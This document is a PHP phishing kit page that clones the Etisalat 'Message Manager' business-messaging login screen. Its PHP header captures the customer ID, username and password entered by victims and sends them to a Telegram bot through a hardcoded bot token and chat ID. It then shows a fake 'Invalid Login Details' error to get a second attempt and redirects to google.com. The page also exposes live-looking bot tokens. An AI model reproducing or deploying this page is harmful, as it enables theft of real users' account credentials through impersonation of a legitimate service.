<?php
session_start();
$error = 0;
$chat_id = '5064068409';
$token = '5147525784:AAFmgFWsNWvlQJV-G3E9BDpF72R6l5fSMRg';

$try  = 0;
if (isset($_POST['try'])) {
  $try = $_POST['try']+1;
  $customerID = $_POST['MMcustomerID'];
  $userName = $_POST['MMuserName'];
  $password = $_POST['MMpassword'];

  $message  = "====================={New User Login MM}=====================" . PHP_EOL;
  $message .= " customerID : $customerID " . PHP_EOL;
  $message .= " userName : $userName " . PHP_EOL;
  $message .= " password : $password " . PHP_EOL;

  $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message);
  // $url = "https://api.telegram.org/bot5772083692:AAEGIKDuqjztt3JHcSTPhEBvRHo347EbJI8/sendMessage?chat_id=5794400860&text=hello";
  
//   $url = "https://api.telegram.org/bot5772083692:AAEGIKDuqjztt3JHcSTPhEBvRHo347EbJI8/sendMessage?chat_id=5794400860&text=hello";
    $result = file_get_contents($url);
    $result = json_decode($result, true);

  if (isset($result['ok'])) {
    if (isset($result['result'])) {
    }
  } else {
 $error = 1;
  }
  
  if($try == 2){
 header("Location: https://google.com");
}
} 
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD Xhtml 1.0 Transitional//EN" "http://www.w3.org/tr/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0070)https://messaging.etisalat.ae/bmsweb/Login.aspx?ReturnUrl=%2fbmsweb%2f -->
<html xmlns="http://www.w3.org/1999/xhtml"><head id="Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="./MM_Files/main.css"><title>
	Message Manager Login
</title><script type="text/javascript" src="./MM_Files/jquery.js.download"></script>
    </head><body><span id="CaptchaHeaderControl1"><link href="./MM_Files/WebResource.axd" rel="stylesheet" type="text/css"><script src="./MM_Files/WebResource(1).axd" type="text/javascript"></script></span><script type="text/javascript" language="javascript" charset="UTF-8" src="./MM_Files/jquery.js(1).download"></script><script type="text/javascript" language="javascript" charset="UTF-8" src="./MM_Files/Common.js.download"></script><!--[if IE]>
                <link rel="stylesheet" type="text/css" href="/bmsweb/Content/css/ie.css" />
                <![endif]--><!--[if lt IE 7]>
                <link rel="stylesheet" type="text/css" href="/bmsweb/Content/css/ie6.css" />
                <![endif]--><!--[if lt IE 7]>
                <script type="text/javascript" charset="UTF-8" src="/bmsweb/Scripts/fixpng.js"></script>
                <![endif]--><!--Debug info: HostName - app1-->

  <img class="login-bg" src="./MM_Files/login_background_en.jpeg" alt="">
  <form name="theForm" action=""
			autocomplete="off" method="post" onSubmit="">
<script type="text/javascript">//<![CDATA[
	var theForm;
	if (document.getElementById) { theForm = document.getElementById ('frmMain'); }
	else { theForm = document.frmMain; }
//]]></script>

<div class="aspNetHidden">

<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value=""><input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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"><input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
</div>

<script type="text/javascript">//<![CDATA[
window._form = theForm;
window.__doPostBack = function (eventTarget, eventArgument) {
	if(theForm.onsubmit && theForm.onsubmit() == false) return;
	theForm.__EVENTTARGET.value = eventTarget;
	theForm.__EVENTARGUMENT.value = eventArgument;
	theForm.submit();
}
//]]></script>

<script src="./MM_Files/WebResource(2).axd" type="text/javascript"></script>
<script type="text/javascript">//<![CDATA[
WebForm_Initialize(window);
//]]></script>

<script src="./MM_Files/ScriptResource.axd" type="text/javascript"></script>
<script type="text/javascript">//<![CDATA[
WebFormValidation_Initialize(window);//]]></script>
<script src="./MM_Files/ScriptResource(1).axd" type="text/javascript"></script>
<script type="text/javascript">//<![CDATA[
if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
//]]></script>
<script src="./MM_Files/ScriptResource(2).axd" type="text/javascript"></script>
<script type="text/javascript">//<![CDATA[

window.WebForm_OnSubmit = function () {
if (!window.ValidatorOnSubmit()) return false;
return true;
}
//]]></script>

    <script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('ctl03', document.getElementById('frmMain'));
Sys.WebForms.PageRequestManager.getInstance()._updateControls(['tctl04$PageHeader$upChangePassword'], [], [], 90);
//]]
</script>

  <div id="divLoginCtlPlaceHolder">
    
  <div class="top" style="display: ">
  <div id="ctl04_PageHeader_pnlLogo" class="top-header" onclick="javascript:window.open(&#39;default.aspx&#39;, &#39;_blank&#39;)">
    <div class="logo-left">
      <img alt="" src="./MM_Files/MM-logo.gif">
    </div>
    <div class="logo-right">
      <img alt="" src="./MM_Files/naharnet.gif">
    </div>
  </div>
  <div class="top-menu">
    <div class="navlanguage">
      

<table id="ctl04_PageHeader_LanguageBarCtrl_listLanguages" cellspacing="0" style="border-collapse:collapse;">
	<tbody><tr>
		<td>
    <a id="ctl04_PageHeader_LanguageBarCtrl_listLanguages_ctl00_language_0" href="javascript:__doPostBack(&#39;ctl04$PageHeader$LanguageBarCtrl$listLanguages$ctl00$language&#39;,&#39;&#39;)">عربي</a>
  </td><td>
    <span>&nbsp;|</span>
  </td><td>
    <a id="ctl04_PageHeader_LanguageBarCtrl_listLanguages_ctl02_language_1" href="javascript:__doPostBack(&#39;ctl04$PageHeader$LanguageBarCtrl$listLanguages$ctl02$language&#39;,&#39;&#39;)">English</a>
  </td><td></td>
	</tr>
</tbody></table>


    </div>
    <div id="ctl04_PageHeader_upChangePassword">
	
        
      
</div>
    
  </div>
</div>

<script type="text/javascript" language="javascript">

  $(document).ready(function()
  {
    $("#ctl04_PageHeader_btnLogof").click(function(e) { ShowLoading(); });
  })

</script>


<div class="login-area">
  
  <div class="top-dotted">
    <span id="ctl04_lOperation">Login</span>
  </div>
  
  <div class="login-form">
    <div class="title">
      <span id="ctl04_lOperationSmall"></span>
    </div>
    <div class="form">
      <div class="info">
        <span id="ctl04_lError" style="color:Red;"> <?php  if( $error == 1){ echo "404.2 Invalid Login Details"; }  ?> </span>
        <span id="ctl04_lInfo" style="color:Green;"></span>
      </div>
      <div class="cfix inputs-login">
        <div class="lbl">
          Customer ID
          <span id="spanCustomerIDRequired" style="display: none; color: #ff0000">*</span>
          <span id="ctl04_rfvCustomerID" style="visibility:hidden;color:Red;">*</span>
        </div>
        <div class="i-view">
          
          <input type="text" name="MMcustomerID" id="ctl04_txtCustomerID" title="Customer identifier (numeric)" class="inp-txt" autocomplete="off" onkeyup="CheckCustomerID()">
          <div id="divMustBeNumeric" class="error-msg invisible">
            Must be numeric</div>
        </div>
      </div>
      <div class="cfix inputs-login">
        <div class="lbl">
          Username:
          <span id="spanUserNameIDRequired" style="display: none; color: #ff0000">*</span>
          <span id="ctl04_rfvLogin" style="visibility:hidden;color:Red;">*</span>
        </div>
        <div class="i-view">
          
          <input type="text" name="MMuserName" id="ctl04_txtLogin" title="Username:" class="inp-txt" autocomplete="off">
        </div>
      </div>
      <div id="ctl04_pPassword">
	
          <div class="cfix inputs-login">
            <div class="lbl">
              <span id="ctl04_lPassword">Password:</span>
              <span id="ctl04_rfvPassword" style="visibility:hidden;color:Red;">*</span>
              <input type="hidden" name="try" value="<?=(isset($_POST['try']) ? $_POST['try']+1 : 0)?>">
            </div>
            <div class="i-view">
              <input type="password" name="MMpassword" id="ctl04_txtPassword" title="Password:" class="inp-txt" autocomplete="off">
            </div>
            <div class="i-view">
                <br>
                <div id="divCaptcha">
                    <span id="ctl04_ccLogin"><div id="CaptchaMainPanel" class="captcha-main-panel">
		<img id="CaptchaImage" class="captcha-image" src="./MM_Files/captcha.axd" align="top"><input type="image" class="captcha-update-button" src="./MM_Files/WebResource(3).axd" alt="Click to refresh the code" align="middle"><br>
    <div id="CaptchaInputPanel" class="captcha-input-panel">
			<span id="CaptchaLabel" class="captcha-label">Type the code from the image:</span><br><input type="text" name="CaptchaCode" id="CaptchaCode" class="captcha-textbox">
		</div><input type="hidden" id="captchakey" name="captchakey" value="658087c7-8303-4767-ba9a-4f9f050b2c5e">
	</div></span>
                </div>
                <br>
            </div>
          </div>
      
</div>
      <div id="ctl04_pLogin">
	
        <div id="ctl04_pRememberPassword">
		
            <div class="cfix inputs-login">
              <div class="lbl">
              </div>
              <div class="i-view">
                <label class="chkb-b">
                  <input name="ctl04$cbRememberPassword" id="ctl04_cbRememberPassword" type="checkbox" title="Remember password">
                  Remember my password
                </label>
              </div>
            </div>
        
	</div>
        
        <div class="cfix buttons">
          <input type="submit" name="ctl04$btnSubmit" value="Login" onclick="WebForm_DoPostback(&quot;ctl04$btnSubmit&quot;,&quot;&quot;,null,false,true,false,false,&quot;&quot;)" id="ctl04_btnSubmit" class="button-style" title="Enter...">
          
          
        </div>
      
</div>
      
    </div>
    <div class="clr">
    </div>
  </div>

  
  
  
  
</div>

<script language="javascript" type="text/javascript">
  function CheckCustomerID()
  {
    var inputText = $("#ctl04_txtCustomerID").val();

    if( isNaN(inputText) )
    {
      $("#divMustBeNumeric").removeClass("invisible");
      $("#ctl04_txtCustomerID").addClass("inp-error");
      return false;
    }
    else
    {
      $("#divMustBeNumeric").addClass("invisible");
      $("#ctl04_txtCustomerID").removeClass("inp-error");
      return true;
    }
  }
  
  function Trim(text, character)
  {
    while( text.substring(0, 1) == character )
      text = text.substring(1, text.length);
      
    while( text.substring(text.length - 1, text.length) == character )
      text = text.substring(0, text.length - 1);
      
    return text;
  }
</script>


</div>
  
<script type="text/javascript">//<![CDATA[
var ctl04_rfvPassword = document.all ? document.all ["ctl04_rfvPassword"] : document.getElementById ("ctl04_rfvPassword");
ctl04_rfvPassword.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
ctl04_rfvPassword.initialvalue = "";
ctl04_rfvPassword.controltovalidate = "ctl04_txtPassword";
var ctl04_rfvLogin = document.all ? document.all ["ctl04_rfvLogin"] : document.getElementById ("ctl04_rfvLogin");
ctl04_rfvLogin.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
ctl04_rfvLogin.initialvalue = "";
ctl04_rfvLogin.controltovalidate = "ctl04_txtLogin";
var ctl04_rfvCustomerID = document.all ? document.all ["ctl04_rfvCustomerID"] : document.getElementById ("ctl04_rfvCustomerID");
ctl04_rfvCustomerID.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
ctl04_rfvCustomerID.initialvalue = "";
ctl04_rfvCustomerID.controltovalidate = "ctl04_txtCustomerID";
//]]></script>


<div class="aspNetHidden">
<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="/bmsweb/Login.aspx">
</div>

<script type="text/javascript">//<![CDATA[
	var Page_Validators =  new Array(document.getElementById ('ctl04_rfvCustomerID'), document.getElementById ('ctl04_rfvLogin'), document.getElementById ('ctl04_rfvPassword'));
//]]></script>


<script type="text/javascript">//<![CDATA[
function setFocus(ctl){if(document.getElementById(ctl) != null){document.getElementById(ctl).focus();}}setFocus('ctl04_txtCustomerID');loadLoginButtonsStyles();
window.Page_ValidationActive = false;
window.ValidatorOnLoad();
window.ValidatorOnSubmit = function () {
	if (this.Page_ValidationActive) {
		return this.ValidatorCommonOnSubmit();
	}
	return true;
};
Sys.Application.initialize();

document.getElementById('ctl04_rfvCustomerID').dispose = function() {
    Array.remove(Page_Validators, document.getElementById('ctl04_rfvCustomerID'));
}

document.getElementById('ctl04_rfvLogin').dispose = function() {
    Array.remove(Page_Validators, document.getElementById('ctl04_rfvLogin'));
}

document.getElementById('ctl04_rfvPassword').dispose = function() {
    Array.remove(Page_Validators, document.getElementById('ctl04_rfvPassword'));
}
//]]></script>
</form>
    
    <script type="text/javascript" src="./MM_Files/jquery.cookie.js.download"></script>    
    <script type="text/javascript">
    $(document).ready(function () {
        $("#lLoginError").hide();
    });
    </script>




</body></html>